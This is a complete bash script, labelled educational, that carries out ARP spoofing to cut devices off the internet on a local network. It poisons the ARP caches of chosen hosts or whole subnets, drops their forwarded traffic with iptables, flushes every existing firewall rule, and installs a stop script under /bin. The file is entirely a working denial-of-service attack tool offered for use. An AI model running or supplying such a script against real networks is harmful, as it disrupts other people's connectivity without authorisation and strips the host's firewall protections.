#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: arpspoof, iptables, ipcalc, and root privileges

# Check for root privileges
if [ "$(id -u)" != "0" ]; then
    echo "This script must be run as root" 1>&2
    exit 1
fi

echo "Enter Router Gateway IP:"
read -p "> " GATEWAY
echo "Enter Target IP(s) (space-separated) or Subnet (e.g., 10.0.0.1/20):"
read -p "> " TARGET_IPS

# Detect Device IP
echo "Enter Device IP (Enter to skip and use detected IP):"
INTERFACE="${INTERFACE:-wlan0}"  # Default interface if not set
IP=$(ip addr show "$INTERFACE" 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1)
if [ -z "$IP" ]; then
    echo "Could not detect IP address for interface $INTERFACE"
    exit 1
fi
read -p "> $IP " DEVIP
MYIP="${DEVIP:-$IP}"

echo "Enter Network Interface (default: wlan0):"
read -p "> " USER_INTERFACE
INTERFACE="${USER_INTERFACE:-wlan0}"

# Verify interface exists
if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
    echo "Interface $INTERFACE does not exist!"
    exit 1
fi

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush all existing iptables rules
iptables -F
iptables -X
iptables -t nat -F
iptables -F FORWARD 

# Create cleanup script
cat > /bin/netkiller-stop << EOF
#!/bin/sh

iptables -F
iptables -X
iptables -t nat -F
iptables -F FORWARD 
pkill -f "arpspoof -i $INTERFACE"
echo "Wifi clients connection are restored...!!!"
EOF
chmod 755 /bin/netkiller-stop

# Function to expand a subnet to individual IPs (using ipcalc)
expand_subnet() {
    SUBNET=$1
    if ! ipcalc -n -b "$SUBNET" >/dev/null 2>&1; then
        echo "Invalid subnet: $SUBNET" >&2
        return 1
    fi
    ipcalc -n -b "$SUBNET" | awk '/HostMin/ {start=$2} /HostMax/ {end=$2} END {if(start && end) print start, end}'
}

# Function to convert IP to integer
ip2int() { 
    local a b c d
    IFS=. read -r a b c d <<< "$1"
    echo "$((a*256**3 + b*256**2 + c*256 + d))"
}

# Function to convert integer to IP
int2ip() { 
    local ip=$1
    echo "$((ip>>24&255)).$((ip>>16&255)).$((ip>>8&255)).$((ip&255))"
}

for TARGET in $TARGET_IPS; do
    if [[ "$TARGET" =~ / ]]; then
        # Expand subnet for ARP spoofing
        if ! read HOSTMIN HOSTMAX < <(expand_subnet "$TARGET"); then
            continue
        fi
        
        if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
            # Convert IPs to integers
            START=$(ip2int "$HOSTMIN")
            END=$(ip2int "$HOSTMAX")
            
            # Skip if conversion failed
            if [ -z "$START" ] || [ -z "$END" ]; then
                echo "Failed to convert IPs for subnet $TARGET" >&2
                continue
            fi
            
            for ((i=START; i<=END; i++)); do
                TARGET_IP=$(int2ip "$i")
                (
                    # Block all the traffic except the device ip and gateway (bidirectional)
                    iptables -I FORWARD -s "$TARGET_IP" -d "$GATEWAY" -j DROP
                    iptables -I FORWARD -s "$GATEWAY" -d "$TARGET_IP" -j DROP
                    
                    arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
                    arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
                ) &
            done
        fi
    else
        (
            # Blocking traffic for Single IP
            iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
            iptables -I FORWARD -s "$GATEWAY" -d "$TARGET" -j DROP

            # Bidirectional Arp Spoofing policy
            arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
            arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
        ) &
    fi
done

echo "Attacks are running in the background...!!!"
echo "Type: sudo netkiller-stop to restore the wifi clients internet connection..."
